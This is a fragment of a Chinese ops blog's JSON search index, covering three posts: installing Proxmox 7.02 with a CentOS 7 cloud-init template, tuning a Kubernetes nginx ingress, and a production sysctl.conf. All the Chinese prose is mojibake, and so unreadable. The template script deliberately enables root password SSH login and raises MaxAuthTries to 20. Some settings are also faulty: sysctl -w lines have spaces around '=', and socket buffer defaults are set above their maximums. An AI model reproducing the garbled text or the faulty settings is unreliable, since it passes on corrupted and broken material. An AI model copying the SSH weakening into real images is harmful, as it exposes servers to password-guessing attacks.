æ„ä¹‰ï¼Œä¸‹é¢ä¹Ÿè¯´ä¸€ä¸‹è·‘åœ¨ç”Ÿäº§çš„æ³¨æ„äº‹é¡¹\né¦–å…ˆæˆ‘ä»¬ç”¨å…‰ç›˜å®‰è£…ï¼š\nç„¶åç¬¬ä¸€ä¸ªæ³¨æ„çš„åœ°æ–¹å°±æ˜¯ç¡¬ç›˜ï¼Œé€‰ Options åï¼š\nä¼šå†’å‡ºä¸€å †é€‰é¡¹ï¼Œå…¬å¸çš„ç”Ÿäº§ç¯å¢ƒï¼ŒæœåŠ¡å™¨å¦‚æœæ²¡æœ‰ raid å¡æ˜¯å¾ˆå¥‡æ€ªçš„ï¼Œæ‰€ä»¥ zfs åè€Œä¸æ˜¯æ ‡é…ï¼Œå› ä¸ºæˆ‘ä»¬ä¼šäº‹å…ˆåœ¨ raid å¡ä¸Šåˆ’åˆ†å¥½ç¡¬ç›˜ï¼Œç”Ÿäº§ç¯å¢ƒåŸºæœ¬å¿…ç„¶æ˜¯ raid10 ï¼Œæ¥ä¸‹æ¥å°±æ˜¯ ext4 å’Œ xfs äºŒé€‰ä¸€äº†ï¼Œå…«æˆ’é€‰ ext4 ï¼Œå› ä¸ºåäº†å¥½ä¿®ç†ï¼Œxfs_repair ç”¨èµ·æ¥ç›¸å½“é¾Ÿæ¯›ï¼š\né‚£ä¹ˆï¼Œé€‰å®šäº† ext4 ï¼Œæ¥ä¸‹æ¥å°±æ¯”è¾ƒé‡è¦äº†\nhdsize 1116.0 ï¼Œå•ä½æ˜¯Gï¼Œè¿™ä¸ªæ˜¯è‡ªåŠ¨æ”¶é›†ä¸Šæ¥çš„ï¼Œä¸ç”¨æ”¹\nswapsizeï¼Œäº¤æ¢åˆ†åŒºå¤§å°ï¼Œè¿™ä¸ªç»™ 8 Gï¼ˆæœ€å¤§8Gï¼‰\nmaxrootï¼Œè¿™ä¸ªåˆ†åŒºæ˜¯ç¬¬ä¸€ä¸ªåˆ†åŒºï¼Œå­˜æ”¾ iso å’Œ template çš„ï¼Œéœ€è¦ç»™å¤Ÿï¼Œ100 G\nminfreeï¼Œç¬¬ä¸€ä¸ªåˆ†åŒºæœ€å°ç•™å¤šå¤§ï¼Œç»™ 10 Gï¼ˆç¼ºçœ16Gï¼‰\nmaxvzï¼Œè¿™ä¸ªåˆ†åŒºæ˜¯ç¬¬äºŒä¸ªåˆ†åŒºï¼Œå­˜æ”¾å®é™…çš„è™šæœºæ–‡ä»¶ï¼Œå…¨éƒ½ç”¨ä¸Šï¼Œä»€ä¹ˆä¹Ÿä¸å¡«å†™\nç„¶åç»§ç»­ï¼Œå›½å®¶é€‰ chinaï¼ŒHostname å¡«å†™ proxmox-168-86-103.localï¼Œå†å¡«å†™å¥½å…¶ä»–ä¿¡æ¯ï¼Œå°±å®‰è£…æˆåŠŸäº†ã€‚\næ‰“å¼€ç½‘é¡µï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸€ä¸ª localï¼Œ100Gï¼Œå¯¹åº”ä¸Šé¢çš„ maxroot\nç„¶å local-lvm ï¼Œå°±æ˜¯å‰©ä½™æ”¾è™šæœºçš„ç©ºé—´\nsshç™»å½•ç³»ç»Ÿï¼Œé¦–å…ˆæ¢æˆä¸­ç§‘å¤§çš„ apt æºï¼Œå¹¶å‡çº§ä¸€ä¸‹ç³»ç»Ÿï¼š\nsed -i \u0026#39;s|^deb http://ftp.debian.org|deb https://mirrors.ustc.edu.cn|g\u0026#39; /etc/apt/sources.list sed -i \u0026#39;s|^deb http://security.debian.org|deb https://mirrors.ustc.edu.cn/debian-security|g\u0026#39; /etc/apt/sources.list CODENAME=`cat /etc/os-release |grep CODENAME |cut -f 2 -d \u0026#34;=\u0026#34;` echo \u0026#34;deb https://mirrors.ustc.edu.cn/proxmox/debian $CODENAME pve-no-subscription\u0026#34; \u0026gt; /etc/apt/sources.list.d/pve-no-subscription.list cat /etc/apt/sources.list.d/pve-no-subscription.list rm /etc/apt/sources.list.d/pve-enterprise.list apt update apt upgrade é‚£ç”Ÿäº§ä½¿ç”¨ï¼Œæ˜¯å¿…é¡»ç”¨ Cloud-init çš„æ ‡å‡†åŒ–é•œåƒçš„ã€‚æˆ‘ä»¬éœ€è¦é€ å‡ºä¸€ä¸ª template ã€‚\nä»¥ Centos7 ä¸ºä¾‹å­\nwget http://cloud.centos.org/centos/7/images/CentOS-7-x86_64-GenericCloud.qcow2 apt-get install libguestfs-tools ç„¶åå‡†å¤‡è„šæœ¬ modify.shï¼š\n#!/bin/sh image_name=CentOS-7-x86_64-GenericCloud.qcow2 # virt-edit -a ${image_name} /etc/cloud/cloud.cfg virt-edit -a ${image_name} /etc/cloud/cloud.cfg -e \u0026#39;s/disable_root: [Tt]rue/disable_root: False/\u0026#39; virt-edit -a ${image_name} /etc/cloud/cloud.cfg -e \u0026#39;s/disable_root: 1/disable_root: 0/\u0026#39; virt-edit -a ${image_name} /etc/cloud/cloud.cfg -e \u0026#39;s/lock_passwd: [Tt]rue/lock_passwd: False/\u0026#39; virt-edit -a ${image_name} /etc/cloud/cloud.cfg -e \u0026#39;s/lock_passwd: 1/lock_passwd: 0/\u0026#39; virt-edit -a ${image_name} /etc/cloud/cloud.cfg -e \u0026#39;s/ssh_pwauth: 0/ssh_pwauth: 1/\u0026#39; virt-edit -a ${image_name} /etc/ssh/sshd_config -e \u0026#39;s/PasswordAuthentication no/PasswordAuthentication yes/\u0026#39; virt-edit -a ${image_name} /etc/ssh/sshd_config -e \u0026#39;s/PermitRootLogin [Nn]o/PermitRootLogin yes/\u0026#39; virt-edit -a ${image_name} /etc/ssh/sshd_config -e \u0026#39;s/#PermitRootLogin [Yy]es/PermitRootLogin yes/\u0026#39; virt-edit -a ${image_name} /etc/ssh/sshd_config -e \u0026#39;s/#PermitRootLogin prohibit-password/PermitRootLogin yes/\u0026#39; virt-edit -a ${image_name} /etc/ssh/sshd_config -e \u0026#39;s/[#M]axAuthTries 6/MaxAuthTries 20/\u0026#39; virt-customize --install cloud-init,atop,htop,nano,vim,qemu-guest-agent,curl,wget,telnet,lsof,screen -a ${image_name} è¿è¡Œå®ƒï¼Œä»¥ä¸Šå‘½ä»¤å…¶å®æ˜¯ä¾µå…¥é•œåƒï¼Œä¿®æ”¹ sshd_config å…è®¸ root ç”¨ password ç™»å½•ï¼Œç„¶ååˆå®‰äº†å‡ ä¸ªå¸¸ç”¨è½¯ä»¶ï¼Œå¤§å®¶å¯ä»¥æŒ‰éœ€ä¿®æ”¹ã€‚\næœ€åç”Ÿæˆ template , è„šæœ¬ï¼š vm.sh\n#!/bin/sh vm_id=9999 image_name=CentOS-7-x86_64-GenericCloud.qcow2 qm create ${vm_id} --memory 8196 --net0 virtio,bridge=vmbr0 qm importdisk ${vm_id} ${image_name} local-lvm qm set ${vm_id} --scsihw virtio-scsi-pci --scsi0 local-lvm:vm-${vm_id}-disk-0 qm set ${vm_id} --ide2 local-lvm:cloudinit qm set ${vm_id} --boot c --bootdisk scsi0 qm set ${vm_id} --serial0 socket --vga serial0 qm template ${vm_id} cloud-init æŠ€æœ¯çš„æ ¸å¿ƒå…¶å®å°±æ˜¯ç”¨é…ç½®æ–‡ä»¶ï¼Œåœ¨è™šæœºå¯åŠ¨çš„æ—¶å€™åŠ¨æ€ä¿®æ”¹ï¼Œè¿™é‡ŒæŠŠé…ç½®æ”¾åˆ°äº† ide2 çš„ä¸€ä¸ªè™šæ‹Ÿ cdrom ä¸­\næœ€ç»ˆä¼šç”Ÿæˆä¸€ä¸ª id ä¸º 9999 çš„ template\næˆ‘ä»¬è¿˜éœ€è¦æ”¹ä¸¤å¤„ï¼š\nä¸€æ˜¯ CPUã€MEMORYã€ç¡¬ç›˜å¤§å°ï¼Œç¼ºçœæ˜¯ 8Gï¼Œæˆ‘ä»¬ç”Ÿäº§çš„é•œåƒæ ‡é…æ˜¯80Gï¼Œéœ€è¦ resize , åŠ  72Gï¼Œåˆè®¡80G\näºŒæ˜¯ cloud-init éƒ¨åˆ†ï¼Œç”¨æˆ·åã€å¯†ç ã€DNSã€IPã€MASKã€GATEWAY\nè¿™æ ·è¿™ä¸ª template å°±åšå¥½äº†ï¼Œåœ¨ç”Ÿäº§çš„æ—¶å€™ï¼Œåªéœ€è¦ clone è¿™ä¸ªæ¨¡æ¿ï¼ˆæ¨¡å¼è¦é€‰ Full Cloneï¼‰ï¼Œç„¶åè®°å¾—ä¿®æ”¹ä¸ºä¸åŒçš„IPï¼Œå°±å¯ä»¥äº†ã€‚\næ€»ä½“æ¥è¯´ï¼Œè¿™ä¸ªä¸œè¥¿åå°ç™½ï¼Œå¯¹äºä¹ æƒ¯äº† KVM çš„äººæ¥è¯´ï¼Œåè€Œä¸å¦‚è„šæœ¬æ¥çš„å¿«ã€‚\nç›¸å…³æ–‡æ¡£ï¼šhttps://whattheserver.com/proxmox-cloud-init-os-template-creation/\n","permalink":"https://rendoumi.com/posts/20211103-proxmox/","summary":"\u003cp\u003eå…¶å®æˆ‘ä»¬çš„ç”Ÿäº§ç¯å¢ƒä¸€ç›´æ˜¯ KVM ï¼Œç„¶åç”¨ shell è„šæœ¬æ§åˆ¶è™šæœºçš„ç”Ÿæˆï¼Œä¹Ÿæ˜¯ç”¨åˆ°äº† Cloud-init çš„æ ‡å‡†é•œåƒã€‚\u003c/p\u003e\n\u003cp\u003eå¬è¯´ Proxmox ä¹Ÿå¾ˆä¸é”™ï¼Œäºæ˜¯æƒ³çœ‹çœ‹èƒ½å¦ä¹Ÿåœ¨ç”Ÿäº§ç¯å¢ƒä¸­ç”¨ä¸Š\u003c/p\u003e\n\u003cp\u003eå¦‚æœåœ¨ç”Ÿäº§ç¯å¢ƒä¸­ç”¨ï¼Œå¿…é¡»è¦è®© proxmox æ”¯æŒ cloud-init ï¼Œå¦åˆ™æ— æ„ä¹‰ï¼Œä¸‹é¢ä¹Ÿè¯´ä¸€ä¸‹è·‘åœ¨ç”Ÿäº§çš„æ³¨æ„äº‹é¡¹\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆæˆ‘ä»¬ç”¨å…‰ç›˜å®‰è£…ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211103100713668\" loading=\"lazy\" src=\"/posts/20211103-proxmox/image-20211103100713668.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç„¶åç¬¬ä¸€ä¸ªæ³¨æ„çš„åœ°æ–¹å°±æ˜¯ç¡¬ç›˜ï¼Œé€‰ Options åï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211103101222517\" loading=\"lazy\" src=\"/posts/20211103-proxmox/image-20211103101222517.png\"\u003e\u003c/p\u003e\n\u003cp\u003eä¼šå†’å‡ºä¸€å †é€‰é¡¹ï¼Œå…¬å¸çš„ç”Ÿäº§ç¯å¢ƒï¼ŒæœåŠ¡å™¨å¦‚æœæ²¡æœ‰ raid å¡æ˜¯å¾ˆå¥‡æ€ªçš„ï¼Œæ‰€ä»¥ zfs åè€Œä¸æ˜¯æ ‡é…ï¼Œå› ä¸ºæˆ‘ä»¬ä¼šäº‹å…ˆåœ¨ raid å¡ä¸Šåˆ’åˆ†å¥½ç¡¬ç›˜ï¼Œç”Ÿäº§ç¯å¢ƒåŸºæœ¬å¿…ç„¶æ˜¯ raid10 ï¼Œæ¥ä¸‹æ¥å°±æ˜¯ ext4 å’Œ xfs äºŒé€‰ä¸€äº†ï¼Œå…«æˆ’é€‰ ext4 ï¼Œå› ä¸ºåäº†å¥½ä¿®ç†ï¼Œxfs_repair ç”¨èµ·æ¥ç›¸å½“é¾Ÿæ¯›ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211103101317418\" loading=\"lazy\" src=\"/posts/20211103-proxmox/image-20211103101317418.png\"\u003e\u003c/p\u003e\n\u003cp\u003eé‚£ä¹ˆï¼Œé€‰å®šäº† ext4 ï¼Œæ¥ä¸‹æ¥å°±æ¯”è¾ƒé‡è¦äº†\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211103104456187\" loading=\"lazy\" src=\"/posts/20211103-proxmox/image-20211103104456187.png\"\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003ehdsize 1116.0 ï¼Œå•ä½æ˜¯Gï¼Œè¿™ä¸ªæ˜¯è‡ªåŠ¨æ”¶é›†ä¸Šæ¥çš„ï¼Œä¸ç”¨æ”¹\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eswapsizeï¼Œäº¤æ¢åˆ†åŒºå¤§å°ï¼Œè¿™ä¸ªç»™ 8 Gï¼ˆæœ€å¤§8Gï¼‰\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003emaxrootï¼Œè¿™ä¸ªåˆ†åŒºæ˜¯ç¬¬ä¸€ä¸ªåˆ†åŒºï¼Œå­˜æ”¾ iso å’Œ template çš„ï¼Œéœ€è¦ç»™å¤Ÿï¼Œ100 G\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eminfreeï¼Œç¬¬ä¸€ä¸ªåˆ†åŒºæœ€å°ç•™å¤šå¤§ï¼Œç»™ 10 Gï¼ˆç¼ºçœ16Gï¼‰\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003emaxvzï¼Œè¿™ä¸ªåˆ†åŒºæ˜¯ç¬¬äºŒä¸ªåˆ†åŒºï¼Œå­˜æ”¾å®é™…çš„è™šæœºæ–‡ä»¶ï¼Œå…¨éƒ½ç”¨ä¸Šï¼Œä»€ä¹ˆä¹Ÿä¸å¡«å†™\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eç„¶åç»§ç»­ï¼Œå›½å®¶é€‰ chinaï¼ŒHostname å¡«å†™ proxmox-168-86-103.localï¼Œå†å¡«å†™å¥½å…¶ä»–ä¿¡æ¯ï¼Œå°±å®‰è£…æˆåŠŸäº†ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211202114720545\" loading=\"lazy\" src=\"/posts/20211103-proxmox/image-20211202114720545.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211202114814774\" loading=\"lazy\" src=\"/posts/20211103-proxmox/image-20211202114814774.png\"\u003e\u003c/p\u003e\n\u003cp\u003eæ‰“å¼€ç½‘é¡µï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸€ä¸ª localï¼Œ100Gï¼Œå¯¹åº”ä¸Šé¢çš„ maxroot\u003c/p\u003e\n\u003cp\u003eç„¶å local-lvm ï¼Œå°±æ˜¯å‰©ä½™æ”¾è™šæœºçš„ç©ºé—´\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211103110216144\" loading=\"lazy\" src=\"/posts/20211103-proxmox/image-20211103110216144.png\"\u003e\u003c/p\u003e","title":"ç”Ÿäº§ç¯å¢ƒProxmox 7.02çš„å®‰è£…å’Œé…ç½®"},{"content":"kubernetes ä¸­ nginx ingress çš„ä¼˜åŒ–åˆ†ä¸¤éƒ¨åˆ†\nä¸€ã€ç³»ç»Ÿsysctléƒ¨åˆ†ä¼˜åŒ– é¦–å…ˆæ˜¯å¯¹nginxå¯åŠ¨å‰çš„ç³»ç»Ÿæ€§èƒ½è¿›è¡Œä¼˜åŒ–ï¼Œè¿™éƒ¨åˆ†è°ƒæ•´ç½‘ç»œçš„ç¼“å†²åŒºï¼Œå‡å°é—²ç½® socket å…³é—­çš„æ—¶é—´\nä»¥é˜¿é‡Œ ACK ä¸ºä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥ç¼–è¾‘ deployments çš„ nginx-ingress-controller\ninitContainers: - command: - /bin/sh - -c - | mount -o remount rw /proc/sys sysctl -w net.core.somaxconn=65535 sysctl -w net.ipv4.ip_local_port_range=\u0026#34;1024 65535\u0026#34; sysctl -w net.ipv4.tcp_tw_reuse=1 sysctl -w fs.file-max=1048576 sysctl -w net.ipv4.tcp_keepalive_time = 300 sysctl -w net.ipv4.tcp_keepalive_probes = 5 sysctl -w net.ipv4.tcp_keepalive_intvl = 15 äºŒã€nginx ingress å‚æ•°ä¼˜åŒ– å¤§å®¶åˆ¶åŠ¨ï¼Œnginx ingree å…¶å®æ˜¯åšä¸ºä¸€ä¸ªä¸­é—´ä»£ç†ï¼Œæ‰€ä»¥ä¸Šä¸‹æ¸¸çš„socketå‚æ•°ä¹Ÿéœ€è¦ä¼˜åŒ–\nåŒæ ·ä»¥é˜¿é‡ŒACKä¸ºä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥ç¼–è¾‘ configmaps çš„ nginx-configuration\napiVersion: v1 data: allow-backend-server-header: \u0026#34;true\u0026#34; enable-underscores-in-headers: \u0026#34;true\u0026#34; generate-request-id: \u0026#34;true\u0026#34; ignore-invalid-headers: \u0026#34;true\u0026#34; log-format-upstream: $remote_addr - [$remote_addr] - $remote_user [$time_local] \u0026#34;$request\u0026#34; $status $body_bytes_sent \u0026#34;$http_referer\u0026#34; \u0026#34;$http_user_agent\u0026#34; $request_length $request_time [$proxy_upstream_name] $upstream_addr $upstream_response_length $upstream_response_time $upstream_status $req_id $host [$proxy_alternative_upstream_name] proxy-body-size: 20m proxy-connect-timeout: \u0026#34;10\u0026#34; reuse-port: \u0026#34;true\u0026#34; server-tokens: \u0026#34;false\u0026#34; ssl-redirect: \u0026#34;false\u0026#34; upstream-keepalive-timeout: \u0026#34;900\u0026#34; keep-alive-requests: \u0026#34;10000\u0026#34; upstream-keepalive-connections: \u0026#34;500\u0026#34; max-worker-connections: \u0026#34;65536\u0026#34; worker-cpu-affinity: auto kind: ConfigMap ","permalink":"https://rendoumi.com/posts/20211102-ingress_nginx/","summary":"\u003cp\u003ekubernetes ä¸­ nginx ingress çš„ä¼˜åŒ–åˆ†ä¸¤éƒ¨åˆ†\u003c/p\u003e\n\u003ch2 id=\"ä¸€ç³»ç»Ÿsysctléƒ¨åˆ†ä¼˜åŒ–\"\u003eä¸€ã€ç³»ç»Ÿsysctléƒ¨åˆ†ä¼˜åŒ–\u003c/h2\u003e\n\u003cp\u003eé¦–å…ˆæ˜¯å¯¹nginxå¯åŠ¨å‰çš„ç³»ç»Ÿæ€§èƒ½è¿›è¡Œä¼˜åŒ–ï¼Œè¿™éƒ¨åˆ†è°ƒæ•´ç½‘ç»œçš„ç¼“å†²åŒºï¼Œå‡å°é—²ç½® socket å…³é—­çš„æ—¶é—´\u003c/p\u003e\n\u003cp\u003eä»¥é˜¿é‡Œ ACK ä¸ºä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥ç¼–è¾‘ deployments çš„ nginx-ingress-controller\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"na\"\u003einitContainers:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"na\"\u003e- command:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"na\"\u003e- /bin/sh\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"na\"\u003e- -c\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"na\"\u003e- |\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          \u003cspan class=\"na\"\u003emount -o remount rw /proc/sys\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          \u003cspan class=\"na\"\u003esysctl -w net.core.somaxconn\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e65535\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e          sysctl -w net.ipv4.ip_local_port_range=\u0026#34;1024 65535\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e          sysctl -w net.ipv4.tcp_tw_reuse=1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e          sysctl -w fs.file-max=1048576\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e          sysctl -w net.ipv4.tcp_keepalive_time = 300\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e          sysctl -w net.ipv4.tcp_keepalive_probes = 5\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e          sysctl -w net.ipv4.tcp_keepalive_intvl = 15\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e          \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"äºŒnginx-ingress-å‚æ•°ä¼˜åŒ–\"\u003eäºŒã€nginx ingress å‚æ•°ä¼˜åŒ–\u003c/h2\u003e\n\u003cp\u003eå¤§å®¶åˆ¶åŠ¨ï¼Œnginx ingree å…¶å®æ˜¯åšä¸ºä¸€ä¸ªä¸­é—´ä»£ç†ï¼Œæ‰€ä»¥ä¸Šä¸‹æ¸¸çš„socketå‚æ•°ä¹Ÿéœ€è¦ä¼˜åŒ–\u003c/p\u003e","title":"k8sä¸­nginx ingressçš„æ€§èƒ½ä¼˜åŒ–"},{"content":"è¿™ç¯‡æ˜¯çº¯é…ç½®ç¯‡ï¼Œè§£é‡Šéƒ½åœ¨é…ç½®é‡Œäº†ï¼Œæ˜¯ç”Ÿäº§æœåŠ¡å™¨ sysctl.conf çš„é…ç½®\n### KERNEL ### # Reboot after 10sec. on kernel panic kernel.panic = 10 ### IMPROVE SYSTEM MEMORY MANAGEMENT ### # Increase size of file handles and inode cache fs.file-max = 2097152 # Insure we always have enough memory vm.min_free_kbytes = 8192 # Do less swapping vm.swappiness = 10 vm.dirty_ratio = 10 vm.dirty_background_ratio = 2 ### GENERAL NETWORK SECURITY OPTIONS ### # Avoid a smurf attack net.ipv4.icmp_echo_ignore_broadcasts = 1 # Turn on protection for bad icmp error messages net.ipv4.icmp_ignore_bogus_error_responses = 1 # Turn on syncookies for SYN flood attack protection net.ipv4.tcp_syncookies = 1 net.ipv4.tcp_max_syn_backlog = 8192 # Turn on timestamping net.ipv4.tcp_timestamps = 1 # Turn on and log spoofed, source routed, and redirect packets net.ipv4.conf.all.log_martians = 1 net.ipv4.conf.default.log_martians = 1 # No source routed packets here net.ipv4.conf.all.accept_source_route = 0 net.ipv4.conf.default.accept_source_route = 0 # Turn on reverse path filtering net.ipv4.conf.all.rp_filter = 1 net.ipv4.conf.default.rp_filter = 1 # Make sure no one can alter the routing tables net.ipv4.conf.all.accept_redirects = 0 net.ipv4.conf.default.accept_redirects = 0 net.ipv4.conf.all.secure_redirects = 0 net.ipv4.conf.default.secure_redirects = 0 # Don\u0026#39;t act as a router net.ipv4.ip_forward = 0 net.ipv4.conf.all.send_redirects = 0 net.ipv4.conf.default.send_redirects = 0 # Number of times SYNACKs for passive TCP connection. net.ipv4.tcp_synack_retries = 2 # Allowed local port range net.ipv4.ip_local_port_range = 1024 65000 # Protect Against TCP Time-Wait net.ipv4.tcp_rfc1337 = 1 # Decrease the time default value for tcp_fin_timeout connection net.ipv4.tcp_fin_timeout = 15 # Decrease the time default value for connections to keep alive net.ipv4.tcp_keepalive_time = 300 net.ipv4.tcp_keepalive_probes = 5 net.ipv4.tcp_keepalive_intvl = 15 # This means that the keepalive process waits 300 seconds for socket # activity before sending the first keepalive probe, and then resend # it every 15 seconds. If no ACK response is received for 5 consecutive # times (75s in this case), the connection is marked as broken. ### TUNING NETWORK PERFORMANCE ### # Disable IPv6 net.ipv6.conf.all.disable_ipv6 = 1 net.ipv6.conf.default.disable_ipv6 = 1 net.ipv6.conf.lo.disable_ipv6 = 1 # Default Socket Receive Buffer net.core.rmem_default = 31457280 # Maximum Socket Receive Buffer net.core.rmem_max = 12582912 # Default Socket Send Buffer net.core.wmem_default = 31457280 # Maximum Socket Send Buffer net.core.wmem_max = 12582912 # Increase number of incoming connections net.core.somaxconn = 5000 # Increase number of incoming connections backlog net.core.netdev_max_backlog = 65536 # Enable TCP window scaling net.ipv4.tcp_window_scaling = 1 # Increase the maximum amount of option memory buffers net.core.optmem_max = 25165824 # Increase the maximum total buffer-space allocatable # This is measured in units of pages (4096 bytes) net.ipv4.tcp_mem = 65536 131072 262144 net.ipv4.udp_mem = 65536 131072 262144 # Increase the read-buffer space allocatable net.ipv4.tcp_rmem = 8192 87380 16777216 net.ipv4.udp_rmem_min = 16384 # Increase the write-buffer-space allocatable net.ipv4.tcp_wmem = 8192 65536 16777216 net.ipv4.udp_wmem_min = 16384 # Increase the tcp-time-wait buckets pool size to prevent simple DOS attacks net.ipv4.tcp_max_tw_buckets = 1800000 # TIME_WAIT socket policy # Note: if both enabled then disable # net.ipv4.tcp_timestamps for servers # behind NAT to prevent dropped incoming connections #net.ipv4.tcp_tw_recycle = 1 net.ipv4.tcp_tw_reuse = 1 # Enable TCP MTU probing (in case of Jumbo Frames enabled) #net.ipv4.tcp_mtu_probing = 1 # Speedup retrans (Google recommended) net.ipv4.tcp_slow_start_after_idle = 0 net.ipv4.tcp_early_retrans = 1 # Conntrack # 288bytes x 131072 = 37748736 (~38MB) max memory usage #net.netfilter.nf_conntrack_max = 131072 #net.netfilter.nf_conntrack_tcp_loose = 1 #TCPçš„ç›´æ¥æ‹¥å¡é€šå‘Š(tcp_ecn)å…³æ‰ net.ipv4.tcp_ecn = 0 #è·¯ç”±ç¼“å­˜åˆ·æ–°é¢‘ç‡ï¼Œå½“ä¸€ä¸ªè·¯ç”±å¤±è´¥åå¤šé•¿æ—¶é—´è·³åˆ°å¦ä¸€ä¸ªè·¯ç”±ï¼Œé»˜è®¤æ˜¯300ã€‚ net.ipv4.route.gc_timeout = 100 #è®¾å®šç³»ç»Ÿä¸­æœ€å¤šå…è®¸åœ¨å¤šå°‘TCPå¥—æ¥å­—ä¸è¢«å…³è”åˆ°ä»»ä½•ä¸€ä¸ªç”¨æˆ·æ–‡ä»¶å¥æŸ„ä¸Šã€‚ #å¦‚æœè¶…è¿‡è¿™ä¸ªæ•°å­—ï¼Œæ²¡æœ‰ä¸ç”¨æˆ·æ–‡ä»¶å¥æŸ„å…³è”çš„TCP å¥—æ¥å­—å°†ç«‹å³è¢«å¤ä½ #é˜²ç®€å•Dos net.ipv4.tcp_max_orphans = 655360 # NOTE: Enable this if machine support it # -- 10gbe tuning from Intel ixgb driver README -- # # turn off selective ACK and timestamps #net.ipv4.tcp_sack = 0 #net.ipv4.tcp_timestamps = 1 ** æ³¨æ„ï¼Œnet.ipv4.tcp_tw_recycle ä¸è¦æ‰“å¼€ï¼Œåœ¨ NAT ç¯å¢ƒä¸­ä¼šå‡ºé”™ï¼Œè€Œä¸”åœ¨ K8S ä¸­ä¹Ÿä¼šå›  NAT å¯¼è‡´ pod å‡ºé”™ï¼Œåˆ‡è®°ï¼ï¼ï¼**\n","permalink":"https://rendoumi.com/posts/20211102-sysctl_conf/","summary":"\u003cp\u003eè¿™ç¯‡æ˜¯çº¯é…ç½®ç¯‡ï¼Œè§£é‡Šéƒ½åœ¨é…ç½®é‡Œäº†ï¼Œæ˜¯ç”Ÿäº§æœåŠ¡å™¨ sysctl.conf çš„é…ç½®\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e### KERNEL ###\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Reboot after 10sec. on kernel panic\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ekernel.panic\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e10\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e### IMPROVE SYSTEM MEMORY MANAGEMENT 